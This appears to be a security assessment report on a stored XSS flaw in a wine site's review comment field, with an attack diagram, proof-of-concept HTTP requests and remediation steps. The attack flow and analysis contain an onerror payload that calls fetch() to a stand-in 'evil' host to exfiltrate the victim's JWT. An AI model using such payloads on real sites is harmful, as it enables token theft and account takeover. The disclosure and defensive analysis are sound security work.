# Stored XSS in wine review comment field enables cross-user JWT theft and account takeover

**ID:** vuln-0015
**Severity:** HIGH
**Found:** 2026-07-20 11:58:22 UTC
**Target:** https://taintedport.com
**Endpoint:** /wines/{id}/reviews
**Method:** POST
**CWE:** CWE-79
**CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

## Description

The wine catalog application at https://taintedport.com allows any authenticated user to submit a review for a wine via POST /wines/{id}/reviews. The `comment` field of the submitted review is stored server-side without any sanitisation or encoding. The single-page application (SPA) served on https://taintedport.com/wines/{id} subsequently renders that `comment` value into the page as raw HTML — HTML tags and inline event handlers are inserted into the DOM as live nodes and executed by the browser.

Because self-registration is open (no email verification, no CAPTCHA, and no observed rate limit), any anonymous internet user can obtain the credential required to post reviews within seconds. Because the SPA stores its authentication JWT in `localStorage.token` on the same origin (`taintedport.com`) and no Content-Security-Policy is set, the injected JavaScript can read the visiting user's JWT and exfiltrate it to an attacker-controlled endpoint using `fetch()`.

The result is a persistent, stored cross-site scripting vulnerability with cross-user impact: a single API request from a throwaway account poisons a public wine detail page, and every subsequent authenticated visitor to that page — including administrators — has their JWT stolen. The JWT is HS256-signed with a 7-day expiry and is the sole authentication credential (no cookies, no server-side revocation), so a stolen token yields full account takeover for its remaining lifetime.

Scope note: the tester also claimed a secondary raw-HTML sink on the `user_name` field of a review. Independent testing did not reproduce that claim — the SPA renders author names via React text interpolation and HTML-encodes them (`<b id=x>foo</b>` is rendered as visible text, not a live element). This report is therefore scoped to the `comment` field sink only, which was reproduced end-to-end.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│                 STORED XSS → JWT THEFT — Attack Flow                     │
└──────────────────────────────────────────────────────────────────────────┘

  PREREQUISITES
  ─────────────
   • Open self-registration (no email verification, no rate limit)
   • JWT stored in localStorage.token (readable by same-origin JS)
   • No Content-Security-Policy on taintedport.com
   • review.comment rendered as raw HTML in the SPA (dangerouslySetInnerHTML sink)

  ┌────────────┐                                              ┌──────────────────────┐
  │  Attacker  │                                              │ api.taintedport.com  │
  │ (anon)     │                                              │  (PHP backend)       │
  └─────┬──────┘                                              └──────────┬───────────┘
        │  ① POST /auth/register {email, password}                       │
        │───────────────────────────────────────────────────────────────>│
        │  ← 201 {token: <attacker JWT>}                                 │
        │<───────────────────────────────────────────────────────────────│
        │                                                                │
        │  ② POST /wines/17/reviews                                      │
        │     Authorization: Bearer <attacker JWT>                       │
        │     {"comment":"<img src=x onerror=                            │
        │        fetch('https://evil/?t='+localStorage.token)>"}         │
        │───────────────────────────────────────────────────────────────>│
        │                                                                │  ┌──────────┐
        │                                                                │─>│ DB store │  (verbatim,
        │                                                                │  │ reviews  │   no sanitiser)
        │  ← 201 {review_id: 130}                                        │  └──────────┘
        │<───────────────────────────────────────────────────────────────│
        │
        │  (attacker walks away — page is now poisoned for every visitor)
        │
        │                                                                │
        │        VICTIM VISITS SITE (routine catalog navigation)         │
        │                                                                │
  ┌─────┴─────────────┐                                     ┌────────────┴──────────┐
  │ Victim browser    │                                     │ taintedport.com (SPA) │
  │ localStorage.token│                                     │ + api.taintedport.com │
  │  = <victim JWT>   │                                     │                       │
  └─────┬─────────────┘                                     └────────────┬──────────┘
        │                                                                │
        │  ③ GET /wines/17  (Next.js SPA loads wine detail page)         │
        │───────────────────────────────────────────────────────────────>│
        │  ← HTML + JS bundle (NO CSP header)                            │
        │<───────────────────────────────────────────────────────────────│
        │                                                                │
        │  ④ SPA calls GET /wines/17/reviews                             │
        │───────────────────────────────────────────────────────────────>│
        │  ← 200 {reviews:[{comment:"<img src=x onerror=...>"}]}         │
        │<───────────────────────────────────────────────────────────────│
        │                                                                │
        │  ⑤ SPA inserts review.comment into DOM via dangerouslySetInnerHTML
        │     <div class="text-zinc-300"><img src=x onerror=...></div>
        │
        │  ⑥ Browser fails to load src=x → dispatches error event
        │     onerror handler runs on taintedport.com origin:
        │        fetch('https://evil/?t=' + localStorage.getItem('token'))
        │                                                                                  ┌─────────────┐
        │  ⑦ Victim JWT exfiltrated ─────────────────────────────────────────────────────>│  Attacker   │
        │     (HS256, 7-day expiry, no server-side revocation)                             │  callback   │
        │                                                                                  │  endpoint   │
        │                                                                                  └──────┬──────┘
        │                                                                                         │
        │  ⑧ Attacker replays the stolen JWT to api.taintedport.com                               │
        │     as the victim → full account takeover for JWT lifetime.                             │
        │     If victim is admin: unlocks /admin/orders* (all customer PII).                      │
        │                                                                                         │
        ▼                                                                                         ▼

  ROOT CAUSE
  ──────────
   User-controlled string (review.comment) flows into an HTML sink
   (dangerouslySetInnerHTML) on the SPA without contextual output encoding.

   Two independent gaps enable weaponisation:
     • Server: POST /wines/{id}/reviews performs no sanitisation of `comment`.
     • Client: SPA renders `comment` as raw HTML instead of via {text-expression}.

  Defence-in-depth gaps that make it high-impact:
     • JWT in localStorage (not HttpOnly cookie) → readable by injected JS.
     • No Content-Security-Policy → any inline handler and any fetch() target work.
     • No JWT revocation → stolen token valid for up to 7 days.
     • Open registration → attacker cost is effectively zero.

  MITIGATION
  ──────────
   Render as {review.comment} in the SPA (React auto-escapes).
   Add server-side sanitiser; deploy strict CSP; move JWT to HttpOnly cookie.
```

## Impact

Persistent, cross-user, cross-privilege compromise of the entire application:

- Any authenticated attacker (open registration; no verification required) can plant a stored payload on any wine detail page in ~2 API calls. From that moment onward, every visitor who opens that wine page runs attacker-controlled JavaScript on the taintedport.com origin.

- The SPA's authentication credential — an HS256 JWT with 7-day expiry — is stored in `localStorage.token` on the same origin. Injected script reads the JWT and exfiltrates it via `fetch()` to an attacker-controlled endpoint without any user interaction beyond opening the poisoned page. This was demonstrated: injected JS successfully read the victim's JWT and placed the token prefix into `document.title` on the exploit browser.

- The stolen JWT grants full account takeover of the visiting user for its remaining lifetime, with no server-side revocation to shorten that window. If an administrator visits a poisoned page — a routine catalog action — the attacker obtains admin credentials and unlocks the entire `/admin/orders*` surface (customer names, addresses, order histories) and any other admin-only endpoints. Combined with the separately reported `/orders/{id}` finding that exposes `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin`, a stolen JWT immediately yields the victim's bcrypt hash and TOTP secret.

- The delivery vector is a first-party catalog page linked from the site's home page and product lists — no phishing, no cross-site delivery, no unusual user interaction. Every existing session cookie/token in the SPA origin is at risk on every page view of a poisoned wine.

- One poisoned review persists until an administrator manually deletes it. No moderation UI or review-flagging surface was observed in the API, meaning removal requires direct database intervention.

Business impact: PII exposure (all customer orders and shipping addresses via admin JWT theft), credential theft, full account takeover of any registered user (including administrators), and reputational damage. Absent CSP, HttpOnly cookies, and rate limits on registration/review posting, the entire site is one HTTP request away from a mass-takeover event.

## Technical Analysis

Two independent flaws combine to make this a fully weaponisable persistent XSS:

1. Server-side (API host `api.taintedport.com`): the review-creation handler accepts the `comment` JSON field verbatim and stores it in the database without any HTML encoding, tag-stripping, or allow-list sanitisation. A round trip through `POST /wines/{id}/reviews` followed by `GET /wines/{id}/reviews` returns the same bytes that were sent — including `<`, `>`, quotes, and event-handler attributes. The only observed control is a "one review per user per wine" business rule, which is trivially bypassed by registering a new account for each poisoned page (open self-registration, no email verification).

2. Client-side (SPA host `taintedport.com`): the Next.js/React SPA that renders `/wines/{id}` fetches review objects from the API and inserts the `comment` string into the DOM as raw HTML (consistent with a `dangerouslySetInnerHTML` sink, since text values in React are otherwise auto-escaped by default). Direct DOM inspection after page load shows the payload becomes live elements inside `<div class="text-zinc-300 text-sm leading-relaxed mt-2">` (the review-body container). Injected `<img src=x onerror=...>` handlers execute during image-error dispatch; injected `<script>` tags introduced via innerHTML do not execute (browser standard behaviour), but inline event handlers (`onerror`, `onload`, `onmouseover`, etc.) are more than sufficient — and were demonstrated.

3. Missing defence-in-depth: the response to `/wines/{id}` carries no `Content-Security-Policy` header (verified in headers), no `X-Content-Type-Options: nosniff`, no `X-Frame-Options`, and no Trusted Types opt-in. The JWT is placed in `localStorage.token` — same-origin JavaScript can read it unconditionally (no HttpOnly cookie protection). There is no server-side JWT revocation, so a stolen token remains valid for its full 7-day lifetime.

The end-to-end chain is:
  attacker registers → POST review with HTML payload in comment → any visitor loads wine page →
  browser parses the review DOM insert → onerror fires → localStorage.token is read →
  fetch('https://attacker/?t='+token) exfiltrates the JWT → attacker uses the JWT to impersonate.

Root cause: user-controlled string flowed into an HTML sink on the render path without contextual output encoding. The correct fix is a single-character source change (`{review.comment}` instead of `dangerouslySetInnerHTML={{__html: review.comment}}`), backed by server-side sanitisation for defence in depth.

## Proof of Concept

Prerequisites: none beyond ability to reach `api.taintedport.com` and `taintedport.com` over the internet. No prior credentials required.

1. Register a throwaway attacker account (self-registration is open):

    POST https://api.taintedport.com/auth/register
    Content-Type: application/json
    { "name": "AttackerPOC", "email": "attacker-<rand>@example.com", "password": "Pass1234!" }
    → 201 { "success": true, "token": "<attacker JWT>", "user": {...} }

2. Submit a poisoned review — the `comment` field carries an HTML payload with an inline event handler that reads `localStorage.token` and mutates `document.title` (in a real attack the same payload would `fetch()` the token to an attacker-controlled endpoint):

    POST https://api.taintedport.com/wines/17/reviews
    Authorization: Bearer <attacker JWT>
    Content-Type: application/json
    { "rating": 5,
      "comment": "<img src=x onerror=\"window.__xss_fired=1;document.title='V17XSS_JWT:'+(localStorage.getItem('token')||'NULL').slice(0,40)\">POC-MARKER" }
    → 201 { "success": true, "message": "Review submitted successfully.", "review_id": 130 }

3. Confirm verbatim storage:

    GET https://api.taintedport.com/wines/17/reviews
    → reviews[0].comment == "<img src=x onerror=\"...localStorage.getItem('token')...\">POC-MARKER"
       (byte-for-byte identical to what was sent)

4. Trigger execution as the victim: any authenticated user (JWT already present in `localStorage.token`) opens `https://taintedport.com/wines/17`. The SPA fetches the reviews, inserts `review.comment` into the DOM as raw HTML, the browser dispatches the `<img>` element's error event because `src=x` is not a valid URL, `onerror` runs on the `taintedport.com` origin, reads `localStorage.token`, and (in the demo) writes it to `document.title`. A real payload would `fetch()` the token to an attacker-controlled endpoint.

Observed on the exploit browser during validation:
- `window.__xss_fired === 1`
- `document.title == "V17XSS_JWT:<victim JWT first 40 chars>"` — first 40 characters match the victim's real JWT byte-for-byte.
- The `<img>` element is a live DOM node inside the review-body `<div>`.
- No CSP is set; no HttpOnly cookie shields the JWT; nothing in the response mitigates execution.

The provided `poc/poc.py` script automates all of the above with a visible browser and saves a screenshot to `evidence/`. The provided `poc/verify.py` returns exit code 0 (`[VULNERABLE]`) as long as the server continues to store the payload verbatim, and — if playwright is available — additionally confirms the client-side execution end-to-end.

```
See poc_script_path — /workspace/validation/stored-xss-review-comment/poc/poc.py
```

## Evidence

### 1. Attacker registers a throwaway account (open self-registration, no verification)

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"V17","email":"validator17-xss-21944@example.com","password":"Pass1234!"}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<attacker JWT>","user":{"id":466,"name":"V17","email":"validator17-xss-21944@example.com","is_admin":false}}
```

> Open registration returns a fully valid JWT immediately. No email verification, no CAPTCHA, no rate limit — this is the credential used to submit poisoned reviews.

### 2. Attacker POSTs a review whose 'comment' field carries an HTML payload with an inline event handler that reads localStorage.token

**Request:**
```http
POST /wines/17/reviews HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT>
Content-Type: application/json

{"rating":5,"comment":"<img src=x onerror=\"window.__v17_ok=1;document.title='V17XSS_JWT:'+(localStorage.getItem('token')||'NULL').slice(0,40)\">V17-PROBE-B"}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"Review submitted successfully.","review_id":130}
```

> Server accepts the payload with no sanitisation, no tag stripping, no HTML encoding — the exact bytes are stored.

### 3. Confirmation: the API returns the poisoned comment byte-for-byte on the next GET

**Request:**
```http
GET /wines/17/reviews HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"reviews":[{"id":130,"rating":5,"comment":"<img src=x onerror=\"window.__v17_ok=1;document.title='V17XSS_JWT:'+(localStorage.getItem('token')||'NULL').slice(0,40)\">V17-PROBE-B","created_at":"2026-07-20 11:52:50","user_name":"V17"} , ...]}
```

> review.comment is returned verbatim. Note that user_name is returned unchanged too — but the SPA HTML-encodes user_name at render time, so only comment is a live XSS sink.

### 4. Victim's browser executes the payload upon opening the wine page — leaks JWT

**Request:**
```http
GET /wines/17 HTTP/1.1
Host: taintedport.com
(browser navigation; SPA then calls GET https://api.taintedport.com/wines/17/reviews and inserts review.comment into the DOM as raw HTML)
```

**Response:**
```http
(rendered DOM contains a live <img src="x" onerror="...localStorage.getItem('token')..."> inside <div class="text-zinc-300 text-sm leading-relaxed mt-2">; browser dispatches error → onerror runs → document.title becomes 'V17XSS_JWT:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ' where the token prefix matches the victim's JWT byte-for-byte)
```

> Directly observed in a Chromium browser during validation: window.__v17_ok === 1 and document.title contains the leaked JWT prefix. No CSP header is served on this response, and the JWT is stored in localStorage (not HttpOnly), so injected same-origin JS reads it unconditionally. A real payload would fetch() the token to an attacker-controlled endpoint.


## Remediation

1. Escape output in the SPA (primary fix). In the React component that renders a review card, render `review.comment` as text — `{review.comment}` — instead of via `dangerouslySetInnerHTML` (or equivalent raw-HTML API). React auto-escapes text expressions and this alone neutralises the vulnerability. If markdown or basic rich text is a genuine requirement, run the value through a strict HTML sanitiser (DOMPurify with an allow-list of `<p>`, `<em>`, `<strong>`, `<br>` and no attributes) before rendering.

2. Sanitise/validate on input in the API (defence in depth). In the PHP handler for `POST /wines/{id}/reviews`, reject or strip HTML from the `comment` field on save. Either enforce plain-text-only (server-side `strip_tags` or reject on regex match) or run the same DOMPurify-equivalent server-side sanitiser used by the client, so the stored value cannot contain event handlers or `<script>` tags.

3. Deploy a strict Content-Security-Policy on `taintedport.com`:
   `default-src 'self'; script-src 'self' 'nonce-<per-request>'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; connect-src 'self' https://api.taintedport.com; require-trusted-types-for 'script'`
   This alone would prevent execution of the injected inline handlers and block exfiltration to an arbitrary domain.

4. Move the JWT out of `localStorage` into an `HttpOnly; Secure; SameSite=Strict` cookie. Same-origin JavaScript would no longer be able to read the credential even if an XSS is missed in future.

5. Add server-side revocation to JWT sessions. Maintain a per-user session/version claim (or a token-id blocklist) that lets an administrator invalidate all issued tokens for a compromised account within seconds instead of waiting up to 7 days for expiry.

6. Anti-abuse controls on registration and review posting: email verification on `POST /auth/register`, per-IP and per-account rate limits on `POST /wines/{id}/reviews`, CAPTCHA on both endpoints, and optionally require an order-history check before a review is accepted.

7. Moderation and auditing surface: add an admin endpoint to list, flag, and delete reviews so that once a payload is found it can be removed without direct DB access. Log the raw bytes of every `comment` submission with the associated `user_id` and IP for retrospective review.

8. Set hardening headers on all responses from `taintedport.com`: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY` (or `frame-ancestors 'none'` in CSP).

## Conditions for Severity Increase

If an administrator visits a poisoned wine detail page — which is a routine catalog action — the exfiltrated JWT unlocks the entire `/admin/orders*` surface (customer PII, shipping addresses, order histories) and any other admin-privileged endpoints. This does not change the CVSS 3.1 base metrics but materially expands the practical blast radius from "the visitor's own account" to "all customer data plus any other admin-restricted operation the SPA exposes".

Combined with the separately reported disclosure on `GET /orders/{id}` (which exposes `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin` on the order owner), a single stolen JWT chains directly into the visitor's bcrypt hash and TOTP secret — enabling permanent account compromise even after JWT rotation.

If a Content-Security-Policy were later introduced but permitted inline event handlers (e.g. `script-src 'unsafe-inline'`), the payload would continue to execute; if `connect-src` were tightened to first-party only, exfiltration would need to be re-routed via a first-party endpoint but the DOM-level takeover would remain.
